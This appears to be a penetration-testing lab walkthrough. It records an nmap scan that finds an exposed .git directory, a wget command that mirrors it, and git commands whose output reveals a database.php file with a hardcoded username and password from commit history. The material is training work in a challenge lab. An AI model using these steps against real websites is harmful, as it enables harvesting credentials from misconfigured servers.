# Git Example
## Nmap Example
```bash

# Nmap 7.95 scan initiated Sun Feb 16 18:28:36 2025 as: /usr/lib/nmap/nmap --privileged -p- -A -T4 -oN CRYSTAL.txt 192.168.178.144
Nmap scan report for 192.168.178.144
Host is up (0.0050s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 fb:ea:e1:18:2f:1d:7b:5e:75:96:5a:98:df:3d:17:e4 (ECDSA)
|_  256 66:f4:54:42:1f:25:16:d7:f3:eb:f7:44:9f:5a:1a:0b (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-git: 
|   192.168.178.144:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: Security Update 
|     Remotes:
|_      https://REDACTED TOKEN@github.com/PWK-Challenge-Lab/dev.git
|_http-title: Home
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-generator: Nicepage 4.21.12, nicepage.com

```

## Download Repository

wget --mirror -I .git http://192.168.178.144/.git/

## Change to the repository
```bash
cd /192.168.178.144
```
## Look at files
```bash
git status

# Results
On branch main
Your branch is ahead of 'origin/main' by 1 commit.
  (use "git push" to publish your local commits)

Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
        deleted:    README.md
        deleted:    api/export.php
        deleted:    api/index.php
        deleted:    api/order.php
        deleted:    configuration/database.php
        deleted:    orders/search.php
        deleted:    robots.txt
```

## View logs

```bash
git log

# Results
commit <REDACTED TOKEN> (HEAD -> main)
Author: Stuart <luke@challenge.pwk>
Date:   Fri Nov 18 16:58:34 2022 -0500

    Security Update

commit <REDACTED TOKEN> (origin/main, origin/HEAD)
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 23:57:12 2022 +0200

    Create database.php

commit <REDACTED TOKEN>
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 23:56:19 2022 +0200

    Delete database.php

commit <REDACTED TOKEN>
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 17:27:40 2022 +0200

    Create robots.txt

commit <REDACTED TOKEN>
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 17:27:08 2022 +0200

    Create search.php

commit <REDACTED TOKEN>
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 17:26:09 2022 +0200

    Setting up database.php

commit <REDACTED TOKEN>
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 17:22:48 2022 +0200

    Create index.php

commit <REDACTED TOKEN>
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 17:22:22 2022 +0200

    Create order.php

commit <REDACTED TOKEN>
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 17:21:50 2022 +0200

    Create export.php

commit <REDACTED TOKEN>
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 17:21:11 2022 +0200

    Initial commit
```
![alt text](image.png)
## View `commit` comments 

```bash
# Pick a commit number above
git show <REDACTED TOKEN>

# Results
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 23:57:12 2022 +0200

    Create database.php

diff --git a/configuration/database.php b/configuration/database.php
new file mode 100644
index 0000000..55b1645
--- /dev/null
+++ b/configuration/database.php
@@ -0,0 +1,19 @@
+<?php
+class Database{
+    private $host = "localhost";
+    private $db_name = "staff";
+    private $username = "stuart@challenge.lab";
+    private $password = "BreakingBad92";
+    public $conn;
+    public function getConnection() {
+        $this->conn = null;
+        try{
+            $this->conn = new PDO("mysql:host=" . $this->host . ";dbname=" . $this->db_name, $this->username, $this->password);
+            $this->conn->exec("set names utf8");
+        }catch(PDOException $exception){
+            echo "Connection error: " . $exception->getMessage();
+        }
+        return $this->conn;
+    }
+}
+?>
```
![alt text](image-1.png)
